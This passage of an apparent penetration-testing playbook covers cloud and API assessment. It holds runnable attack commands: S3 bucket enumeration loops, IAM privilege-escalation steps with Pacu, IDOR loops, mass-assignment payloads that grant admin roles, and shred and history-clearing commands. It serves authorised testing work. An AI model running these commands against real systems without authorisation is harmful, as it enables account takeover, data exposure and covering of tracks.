# Methodology: PTES + OWASP Testing Guide
# Testers: [Names, Certs: OSCP/CEH/GPEN]
# Of [X] findings: [Y] resolved (verified [RETEST DATE])
# [Z] accepted as risk by [EXEC NAME] on [DATE]
# Signed: [Your Name, Certs, Title, Company]

# Securely purge client credentials:
shred -vzu -n 3 ~/pentests/{CLIENT}/exploitation/credentials.txt
shred -vzu -n 3 ~/pentests/{CLIENT}/exploitation/*.txt
history -c && history -w
commands.example: Issue on company letterhead. Required for PCI-DSS, SOC 2, cyber insurance renewals.
commands.note: Clients need this for PCI-DSS QSA audits, SOC 2, cyber insurance, partner due diligence. Price it as a separate deliverable.
commands.out: Formal attestation letter + clean attack machine

steps.deliverable: Re-test report + attestation letter + signed closure
steps.tip: The closure meeting is a sales opportunity. Clients who watched you find and verify fixes are primed for retainer conversations. Come with a proposal.

label: Cloud Assessment
desc: AWS, Azure, GCP misconfigurations, IAM privilege escalation, exposed storage

steps.title: Cloud Asset Discovery
steps.summary: Identify cloud provider, exposed storage, and leaked credentials before touching the environment.
checklist: Search for exposed S3/Blob/GCS buckets in OSINT
Check GitHub/GitLab for leaked cloud credentials
Check Shodan for cloud metadata endpoints
Verify bucket enumeration findings via unauthenticated access

commands.title: S3 Bucket Discovery & Access Test
commands.purpose: Find exposed S3 buckets belonging to target org
commands.cmd:
# Unauthenticated bucket access:
aws s3 ls s3://{COMPANY}-{SUFFIX} --no-sign-request

# Common suffixes to try:
for suffix in backup backups dev prod data logs assets media files; do
  aws s3 ls s3://{COMPANY}-$suffix --no-sign-request 2>/dev/null && echo "FOUND: {COMPANY}-$suffix"
done

# Check bucket ACL (is it truly public?):
aws s3api get-bucket-acl --bucket {BUCKET_NAME} --no-sign-request
aws s3api get-bucket-policy --bucket {BUCKET_NAME} --no-sign-request

flags.d: Access as anonymous — tests public buckets
Read S3 policy for AllUsers grants

commands.note: Try: {company}, {company}-backup, {company}-prod, {company}-dev, {company}-data, {company}-logs, {company}-assets
commands.out: File listing = exposed. AccessDenied = bucket exists but private. NoSuchBucket = doesn't exist

commands.title: Multi-Cloud Audit — ScoutSuite
commands.purpose: Full security posture scan across AWS/Azure/GCP
commands.cmd:
# AWS:
scout aws --report-dir ~/pentests/{CLIENT}/cloud/scout-aws/

# Azure (with az cli):
scout azure --cli --report-dir ~/pentests/{CLIENT}/cloud/scout-azure/

# GCP:
scout gcp --user-account --report-dir ~/pentests/{CLIENT}/cloud/scout-gcp/

# Open report:
xdg-open ~/pentests/{CLIENT}/cloud/scout-aws/scoutsuite-report/scoutsuite_results.html
commands.note: Requires valid cloud credentials. Run with read-only role if grey-box. Full scan takes 10-30 minutes.
commands.out: HTML report with 200+ security checks — IAM, storage, network, encryption, logging

steps.deliverable: Cloud asset inventory + exposed resources list + credential leak findings
steps.tip: Always grep GitHub repos for the company name + 'AKIA' (AWS key prefix). Developers leak cloud keys constantly. One leaked key = full account access.

steps.title: IAM Enumeration & Privilege Escalation
steps.summary: Map all IAM permissions and find escalation paths to admin.
checklist: Get current identity: aws sts get-caller-identity
List all attached policies for current user/role
Check for iam:CreatePolicyVersion on managed policies
Check for EC2 instance profile with admin rights
Run Pacu for automated privilege escalation

commands.title: IAM Permission Enumeration
commands.purpose: Map exactly what the current credentials can do
commands.cmd:
# Who am I? (ALWAYS first command):
aws sts get-caller-identity

# List attached policies:
aws iam list-attached-user-policies --user-name {USERNAME}
aws iam list-user-policies --user-name {USERNAME}
aws iam list-groups-for-user --user-name {USERNAME}

# Get policy document (what can I actually do?):
aws iam get-policy-version \
  --policy-arn {POLICY_ARN} \
  --version-id v1

# Automated enumeration with Pacu:
python3 pacu.py
# Pacu commands:
# > import_keys {PROFILE_NAME}
# > run iam__enum_permissions
# > run iam__privesc_scan
commands.example: aws sts get-caller-identity && aws iam list-attached-user-policies --user-name dev-user
commands.note: Document EVERY permission before attempting escalation. Noisy IAM calls are logged in CloudTrail.
commands.out: Full permission list + identified escalation paths

commands.title: Prowler Compliance & Security Scan
commands.purpose: CIS Benchmark, GDPR, HIPAA, SOC2 checks for AWS
commands.cmd:
# Full compliance scan:
prowler aws -f {REGION} -M html,json -o ~/pentests/{CLIENT}/cloud/prowler/

# Specific high-value checks:
prowler aws --checks \
  iam_root_mfa_enabled \
  iam_user_no_setup_initial_access_key \
  s3_bucket_public_access \
  ec2_securitygroup_default_restrict_traffic \
  cloudtrail_multi_region_enabled

# List all available checks:
prowler aws --list-checks
commands.note: Over 300 checks. CIS, GDPR, PCI-DSS, HIPAA, SOC2 frameworks all supported. Essential for compliance-focused clients.
commands.out: Pass/Fail for each control with severity + remediation guidance

steps.deliverable: IAM privilege escalation paths, compliance report, remediation roadmap
steps.tip: iam:PassRole is the #1 AWS privilege escalation path. If you can pass a role with AdministratorAccess to a Lambda function you control, you own the account silently.

label: API Security
desc: REST, GraphQL, SOAP — OWASP API Top 10 systematic assessment

steps.title: API Discovery & Mapping
steps.summary: Enumerate all API endpoints, auth mechanisms, and data flows before testing.
checklist: Enumerate endpoints from JS files and responses
Identify authentication: JWT, OAuth, API key, session
Find versioned endpoints (v1, v2, v3 — old versions often less patched)
Map all HTTP methods per endpoint

commands.title: API Endpoint Discovery
commands.purpose: Find all API endpoints via automated and manual techniques
commands.cmd:
# Extract endpoints from JavaScript files:
gau {DOMAIN} | grep -iE 'api|/v[0-9]|swagger|openapi|graphql'

# Kiterunner — API-aware discovery:
kr scan https://{TARGET}/api/ \
  -w ~/tools/kiterunner/routes-large.kite \
  -x 20 --fail-status-codes 404,400

# ffuf for API paths:
ffuf -u https://{TARGET}/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,400,401,403,405 -of csv -o api_endpoints.csv

# Check for documentation:
curl -sk https://{TARGET}/swagger.json
curl -sk https://{TARGET}/openapi.yaml
curl -sk https://{TARGET}/api-docs

flags.d: Ignore these status codes in results
Match these status codes only (401/403 = endpoint exists but requires auth)

commands.note: 401 and 403 responses are valuable finds — the endpoint exists. 405 = wrong method, try GET/POST/PUT/DELETE.
commands.out: Full endpoint inventory with status codes and methods

commands.title: GraphQL Security Testing
commands.purpose: Test introspection, injection, batching, and authorization on GraphQL APIs
commands.cmd:
# Test if introspection enabled (massive info leak):
curl -s -X POST https://{TARGET}/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'  

# graphql-cop full audit:
graphql-cop -t https://{TARGET}/graphql -v

# Introspection to map all queries/mutations:
python3 -c "
import requests,json
r=requests.post('https://{TARGET}/graphql',
  json={'query':'{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind}}}}}'},
  verify=False)
print(json.dumps(r.json(),indent=2))
"

flags.d: Full schema introspection — lists every query, mutation, type

commands.note: Introspection enabled in production = OWASP API9 violation. Gives attacker complete API blueprint.
commands.out: All queries/mutations/types if introspection enabled + security issues found

steps.deliverable: Complete API inventory with auth mapping and versioning matrix
steps.tip: Check old API versions: if /api/v2/users is the current endpoint, /api/v1/users might still work — and v1 often has weaker authorization.

steps.title: OWASP API Top 10 Assessment
steps.summary: Systematically test all 10 OWASP API security categories with specific payloads.
checklist: API1:2023 BOLA — Test IDOR on all object IDs (change user ID, order ID, etc.)
API2:2023 Broken Auth — Test JWT attacks, weak secrets, missing expiry
API3:2023 BOPLA — Mass assignment via extra fields in POST/PUT body
API4:2023 Resource Consumption — Rate limiting, no pagination limits
API5:2023 BFLA — Access admin-level functions as regular user
API6:2023 Unrestricted Access — Business logic bypass
API7:2023 SSRF — URL parameters that trigger server-side requests
API8:2023 Misconfiguration — CORS, debug endpoints, verbose errors
API9:2023 Improper Inventory — Deprecated versions still accessible
API10:2023 Unsafe API Consumption — Trust in third-party APIs

commands.title: BOLA / IDOR Testing (API1)
commands.purpose: Access other users objects by manipulating IDs
commands.cmd:
# Capture your auth token, then access other users' data:

# Sequential ID test:
for id in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} $id\n" \
    -H 'Authorization: Bearer {YOUR_TOKEN}' \
    https://{TARGET}/api/v1/users/$id/profile
done

# GUID/UUID test (get another user's UUID from any leak):
curl -H 'Authorization: Bearer {YOUR_TOKEN}' \
  https://{TARGET}/api/v1/orders/{OTHER_USER_UUID}

# Horizontal privilege escalation:
curl -H 'Authorization: Bearer {USER_A_TOKEN}' \
  https://{TARGET}/api/v1/users/{USER_B_ID}/documents

flags.d: Test numeric IDs, GUIDs, usernames, email as identifiers
Test all HTTP methods: GET, PUT, DELETE on other users objects

commands.note: BOLA/IDOR is the #1 API vulnerability by frequency. Every object endpoint must be tested.
commands.out: 200 OK with another users data = Critical BOLA finding

commands.title: Mass Assignment Testing (API3)
commands.purpose: Add unauthorized fields to API requests to escalate privileges
commands.cmd:
# Registration — add admin flag:
curl -s -X POST https://{TARGET}/api/v1/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"test","password":"Test123!",
       "admin":true,"role":"admin","isVerified":true}'

# Profile update — add credit/balance:
curl -s -X PUT https://{TARGET}/api/v1/users/{USER_ID} \
  -H 'Authorization: Bearer {TOKEN}' \
  -H 'Content-Type: application/json' \
  -d '{"email":"new@test.com","isAdmin":true,"credits":99999,"planTier":"enterprise"}'

# Use Burp Param Miner to find hidden parameters automatically

flags.d: Fields to try: admin, isAdmin, role, credits, balance, verified, approved, planTier
Check response body — does it echo back the field you sent?

commands.note: If the server echoes back admin:true or role:admin in the response, the assignment succeeded.
commands.out: Elevated role or credits in response = Mass Assignment (High/Critical)

steps.deliverable: OWASP API Top 10 assessment with PoC for each finding
steps.tip: Install Burp extension 'Param Miner' — it discovers hidden parameters in seconds. This finds mass assignment candidates automatically.
